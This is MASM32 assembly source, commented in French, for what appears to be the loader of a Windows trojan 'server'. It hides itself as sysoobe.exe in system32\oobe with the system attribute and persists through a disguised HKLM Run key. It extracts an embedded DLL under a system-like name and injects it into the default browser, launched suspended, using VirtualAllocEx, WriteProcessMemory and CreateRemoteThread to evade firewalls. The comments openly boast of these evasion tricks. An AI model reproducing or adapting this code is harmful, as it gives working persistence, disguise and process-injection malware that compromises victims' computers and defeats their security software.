.386
.model flat,stdcall
option casemap:none

;Includes
include \masm32\include\windows.inc
include \masm32\include\kernel32.inc
include \masm32\include\masm32.inc
include \masm32\include\rasapi32.inc
include \masm32\include\advapi32.inc
include \masm32\include\shell32.inc
include \masm32\include\wsock32.inc

includelib \masm32\lib\kernel32.lib
includelib \masm32\lib\shell32.lib
includelib  \masm32\lib\masm32.lib
includelib \masm32\lib\rasapi32.lib
includelib \masm32\lib\advapi32.lib
includelib \masm32\lib\wsock32.lib

.data 
KeyToLoad		DB 		"SOFTWARE\Microsoft\Windows\CurrentVersion\Run",0
NameOfKey		DB		"Gestionnaire de disques universel",0
sz_NewFile		DB		"sysoobe.exe",0
sz_NewDir		DB		"\system32\oobe\",0
sz_Shell		DB		"\system32\cmd.exe",0
sz_DllName		DB		"ws_sk32.dll",0
sz_TestFile		DB		"just_for_find_browser.html",0

.data? 
Startup			STARTUPINFO<>
ProcInfo		PROCESS_INFORMATION<>
sz_CurFilePath	DB 300 DUP(?)
sz_FileDir		DB 300 DUP(?)

;Variables "gardees"
sz_Browser		DB 500 dup(?)
LoadKey_Val		DB 200 DUP(?)
sz_SysDir		DB 300 DUP(?)
sz_RcpFilePath	DB 300 DUP(?)
; -------------
sz_BytesWritten DD ?
LoadKey_Buf		DD ?
hKey			DD ?
hTemp			DD ?
hModule			DD ?
hNewModule		DD ?
sz_Size			DD ?
hRes			DD ?
hFile			DD ?
hInstance	 	DD ?
TID				DD ?

.code

InjectedThread proc			; Voici le  thread que l'on va injecter, et qui dit "charge la DLL bonhomme !"
	Push OFFSET sz_CurFilePath
	Call LoadLibrary
	Ret
InjectedThread EndP

start:
Push 0
Call GetModuleHandle			; on récupere un handle vers notre processus

Mov  hInstance, EAX

Push 256 
Push OFFSET sz_CurFilePath
Push hInstance
Call GetModuleFileName			; on regarde ou on est

Push 100
Push OFFSET sz_FileDir 
Call GetWindowsDirectory 		; on récupere le dossier Windows, disons C:\Windows

Push OFFSET sz_FileDir
Push OFFSET sz_SysDir
Call lstrcat					; On le copie dans sz_Sysdir

Push OFFSET sz_NewDir
Push OFFSET sz_SysDir			; On concatene C:\Windows et la variable sz_NewDir, donc :
Call lstrcat					; C:\Windows\system32\oobe

Push OFFSET sz_SysDir
Push OFFSET sz_RcpFilePath		; on Copie la variable sysDir dans RcpFilePath
Call lstrcat

Push OFFSET sz_NewFile			; on y ajoute la variable NewFile, donc, sysoobe.exe
Push OFFSET sz_RcpFilePath		; Donc, RcpFilePath = C:\Windows\System32\oobe\sysoobe.exe
Call lstrcat

Push OFFSET sz_RcpFilePath
Push OFFSET sz_CurFilePath		; On compare avec notre chemin actuel, tiens :]
Call lstrcmpi

.IF EAX != 0	; Argh, c'est pas la même chose ! On est donc pas dans le bon dossier !
	Push 0
	Push OFFSET sz_SysDir
	Call CreateDirectory	; Melt Serveur activé :P

	Push MOVEFILE_REPLACE_EXISTING
	Push OFFSET sz_RcpFilePath
	Push OFFSET sz_CurFilePath	; On bouge notre fichier dans le bon dossier, sous le nom sysoobe.exe, dans le dossier oobe de System32
	Call MoveFileEx
	
	Push SW_SHOW
	Push 0				; On l'execute, malin que nous sommes. En SW_SHOW, car de cette manière,
	Push 0				; Nous n'aurons pas l'avertissement d'un programme lancé en mode caché
	Push OFFSET sz_RcpFilePath
	Push 0
	Push 0
	Call ShellExecute	
	
	Push 0
	Call ExitProcess

.ENDIF
	Push FILE_ATTRIBUTE_SYSTEM
	Push OFFSET sz_RcpFilePath
	Call SetFileAttributes	; On met les attributs système a notre ficheir serveur, histoire de dissuader l'utilisateur lambda
	
	Push OFFSET hKey
	Push KEY_ALL_ACCESS
	Push 0
	Push OFFSET KeyToLoad
	Push HKEY_LOCAL_MACHINE
	Call RegOpenKeyEx		; On crée notre clée de run
	
	Mov  LoadKey_Buf, 100
	
	Push OFFSET LoadKey_Buf
	Push OFFSET LoadKey_Val
	Push 0
	Push 0
	Push OFFSET NameOfKey
	Push hKey
	Call RegQueryValueEx	; On regarde, notre clée est déja présente ? On prend la valeur !

	Push OFFSET LoadKey_Val
	Push OFFSET sz_CurFilePath
	Call lstrcmp			; On compare ce qu'elle est avec ce qu'elle DEVRAIT etre
	
	.IF EAX ==0				; C'est OK, Chef !
	JMP @BeginProc			; On va direct a la procédure d'injection ( ca fait un peu jeu de role, je sais )
	.ENDIF

	Push OFFSET sz_CurFilePath
	Call lstrlen			; On calcule la longueur de notre chemin de fichier
	
	Inc  EAX				; On ajoute le caractere 0, qui termine la variable
	
	Push EAX
	Push OFFSET sz_CurFilePath
	Push REG_SZ
	Push 0
	Push OFFSET NameOfKey
	Push hKey	
	Call RegSetValueEx	; Nous rendons justice et on remet la bonne valeur a la clée de registre
	
	Push hKey
	Call RegCloseKey	; on ferme le handle vers la clée de registre

@BeginProc:
Push OFFSET sz_SysDir			; On place notre dossier d'execution dans Windows\System32\oobe, 
Call SetCurrentDirectory		; qui était auparavant le dossier d'execution du PREMIER serveur 

Push 0
Push FILE_ATTRIBUTE_NORMAL
Push CREATE_ALWAYS
Push 0
Push 0
Push GENERIC_READ+GENERIC_WRITE
Push OFFSET sz_DllName
Call CreateFile					; Procédure pour extraire la DLL que l'on compte injecter :]
Mov	 hFile, EAX					; On bouge le handle dans la variable hFile

Push RT_RCDATA
Push 1111
Push 0
Call FindResource				; On la localise dans les resources

Mov  hTemp, EAX

Push EAX
Push 0
Call LoadResource				; On la charge

Mov  hRes, EAX

Push hTemp
Push 0
Call SizeofResource				; On calcule sa taille :]

Push 0
Push OFFSET sz_BytesWritten
Push EAX
Push hRes
Push hFile
Call WriteFile					; On écrit le fichier en entier, on obtient donc joyeusement notre dll toute prete et fraiche :)

Push hFile
Call CloseHandle				; on ferme le handle, pour pouvoir se servir de la DLL comme on le souhaite

Push SIZEOF sz_CurFilePath
Push OFFSET sz_CurFilePath
Call RtlZeroMemory				; on vide le buffer qui contient le chemin du fichier sysoobe.exe

Push OFFSET sz_SysDir
Push OFFSET sz_CurFilePath		; on place le chemin C:\Windows\system32\oobe dans ce buffer
Call lstrcat

Push OFFSET sz_DllName
Push OFFSET sz_CurFilePath		; on y ajoute notre nom de dll ! Soyons fous ! 
Call lstrcat					; C:\Windows\System32\oobe\ws_sk32.dll

Push 0
Push FILE_ATTRIBUTE_NORMAL
Push CREATE_ALWAYS
Push 0
Push 0
Push GENERIC_WRITE+GENERIC_READ
Push OFFSET sz_TestFile
Call CreateFile					; On crée un fichier .html, nommé just_for_find_browser.html

Push EAX
Call CloseHandle				; on ferme son handle

Push OFFSET sz_Browser			; on récupere le chemin du programme qui sert a l'ouvrir 
Push 0							; ( normalement le browser par défaut .. on commence a voir l'ébauche de l'injection :P )
Push OFFSET sz_TestFile			; Petite note, si le programme par défaut pour ouvrir les .html est le bloc note, 
Call FindExecutable				; on aura l'air malin, mais c'est pas grave :P
	
Push OFFSET sz_TestFile
Call DeleteFile					; on supprime ce fichier .html, qui est resté affiché environ une demi seconde.. rapide. :]
									; On prépare la structure Startup pour le lancement du browser
Mov Startup.cb,sizeof STARTUPINFO	; On dit "la taille de cette structure est la taille de la structure STARTUPINFO
Mov Startup.lpReserved,NULL			; C'est une variable obligee, on y coupe pas .. donc on met 0
Mov Startup.wShowWindow,SW_SHOW		; On dit "Okay, au lancement, tu AFFICHES le browser, on le met pas en hidden !"
Mov Startup.lpReserved2,NULL		; même chose qu'avec reserved, on y coupe pas
Mov Startup.dwFlags,STARTF_USESHOWWINDOW ; on dit "Hey, on a mis un truc dans la partie wShowWindow, prend le en compte"

Push OFFSET ProcInfo				; On met les résultats dans la structure ProcInfo
Push OFFSET Startup					; on utilise la structure Startup pour lancer le programme
Push 0
Push 0
Push CREATE_SUSPENDED				; on lancel e programme, oui, mais on le lance en pause .. huhu ..
Push TRUE							; puisqu'il est affiché en mode pause, aucune fenêtre ne sera affichée,
Push 0								; et le firewall ne dira pas que le navigateur a été lancé en mode hidden
Push 0								; petite astuce pour le fun, quoi :]
Push OFFSET sz_Browser
Push 0
Call CreateProcess					; on finit par le lancer, ce satané browser

Push 0
Call GetModuleHandle				; procédure d'injection qui commence .. on récupere un handle pour notre prcessus

Mov    hModule, eax					; on le met dans hModule
Mov    EDI, EAX 					; on bouge le contenu de EAX dans EDI
Assume EDI:ptr IMAGE_DOS_HEADER 	; on suppose que EDI pointe vers la section IMAGE_DOS_HEADER du PE de notre fichier
Add    EDI, [EDI].e_lfanew			; On se positionne sur le bon endroit, et on calcule la taille necessaire	
Add    EDI, sizeof dword
Add    EDI, sizeof IMAGE_FILE_HEADER
Assume EDI:ptr IMAGE_OPTIONAL_HEADER32 ; Autre section du PE Header
Mov    EAX, [EDI].SizeOfImage
mov    sz_Size, EAX					; Et l'on obtient ici la taille que l'on compte injecter :] Magique :]
Assume EDI:NOTHING					; On dit que EDI ne vaut plus rien maintenant.

Push MEM_RELEASE
Push 0
Push hModule
Push ProcInfo.hProcess
Call VirtualFreeEx				; On libere de l'espace mémoire dans la mémoire du browser lancé, qui attend, mine de rien

Push PAGE_EXECUTE_READWRITE
Push MEM_COMMIT + MEM_RESERVE
Push sz_Size
Push hModule
Push ProcInfo.hProcess
Call VirtualAllocEx				; on alloue l'espace mémoire necessaire a notre injection :]
Mov  hNewModule, EAX

Push OFFSET sz_BytesWritten
Push sz_Size
Push hModule
Push hNewModule
Push ProcInfo.hProcess
Call WriteProcessMemory			; On y écrit tout ce dont on a besoin pour l'injection, comme la taille, le processus, tout ca ..

Push OFFSET TID
Push 0
Push hModule
Push OFFSET InjectedThread	; Youpi, tout est pret ! On crée donc un thread dans le browser, thread qui est celui décrit plus haut ..
Push 0						; .. et qui charge notre DLL en mémoire :] On a donc notre injection de prête ...et executée.
Push 0						
Push ProcInfo.hProcess
Call CreateRemoteThread		

Push 0
Call ExitProcess			; On quitte le programme .Exe, qui ne sert plus a rien, du coup.


end start